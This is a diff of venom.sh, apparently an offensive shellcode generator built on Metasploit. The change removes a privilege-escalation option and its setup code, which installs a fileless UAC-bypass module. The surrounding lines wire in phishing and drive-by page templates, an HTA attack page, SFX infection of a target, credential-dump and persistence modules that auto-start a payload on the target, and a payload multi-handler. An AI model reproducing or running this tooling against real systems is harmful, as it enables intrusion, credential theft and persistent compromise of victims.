@@ -66,7 +66,7 @@ InJEc12="$IPATH/templates/phishing/mega.html" # fake webpage script path
 InJEc13="$IPATH/templates/phishing/driveBy.html" # fake webpage script path
 InJEc14="$IPATH/templates/hta_attack/index.html" # fake webpage script path
 InJEc15="$IPATH/templates/exec_psh.c" # c script path
-InJEc16="$IPATH/templates/exec.jar" # jat script path
+InJEc16="$IPATH/templates/exec.jar" # jar script path
 
 
 
@@ -231,6 +231,7 @@ mv $IPATH/templates/web_delivery[bak].bat $IPATH/templates/web_delivery.bat > /d
 mv $IPATH/templates/evil_pdf/PDF-encoder[bak].py PDF-encoder.py > /dev/null 2>&1
 mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
 mv $IPATH/aux/persistence2[bak].rc $IPATH/aux/persistence2.rc > /dev/null 2>&1
+mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
 # delete temp generated files
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm $IPATH/templates/trigger.raw > /dev/null 2>&1
@@ -262,7 +263,7 @@ rm -r $IPATH/dist > /dev/null 2>&1
 rm -r $IPATH/build > /dev/null 2>&1
 # exit venom.sh
 echo "[☠ ] Exit Shellcode Generator..."
-echo "[_Codename:the beast]"
+echo "[_Codename:$C0d3]"
 echo "☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆ ☆"
 sleep 1
 if [ "$DiStR0" = "Kali" ]; then
@@ -754,7 +755,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
 
 
       N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.dll needs to be\ncompressed together with trigger.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" --width 350 --height 280) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" --width 350 --height 260) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start trigger.bat on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -775,17 +776,6 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
     echo "exploit" >> $lhost.rc
     mv $lhost.rc $IPATH/output/$lhost.rc
     cd $IPATH
-
-    elif [ "$P0" = "privilege_escalation.rc" ]; then
-      cd $IPATH/aux
-      # Build privilege_escalation script (AutoRunStart='multi_console_command -rc')
-      cp privilege_escalation.rc privilege_escalation[bak].rc
-      cp enigma_fileless_uac_bypass.rb $mSf/enigma_fileless_uac_bypass.rb
-      echo "[☠ ] reloading -> Metasploit database!"
-      msfconsole -x 'reload_all; exit -y' > /dev/null 2>&1
-      sed -i "s|N4m|$N4m2|g" privilege_escalation.rc
-      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
-      cd $IPATH
 
   else
 
@@ -836,7 +826,6 @@ sleep 2
 # CLEANING EVERYTHING UP
 echo "[☠ ] Cleanning temp generated files..."
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
-mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
 mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
 mv $IPATH/aux/persistence2[bak].rc $IPATH/aux/persistence2.rc > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
@@ -2235,6 +2224,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
 
 
       P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" --width 350 --height 240) > /dev/null 2>&1
+
       # edit files nedded
       cd $IPATH/templates/phishing
       cp $InJEc12 mega[bak].html
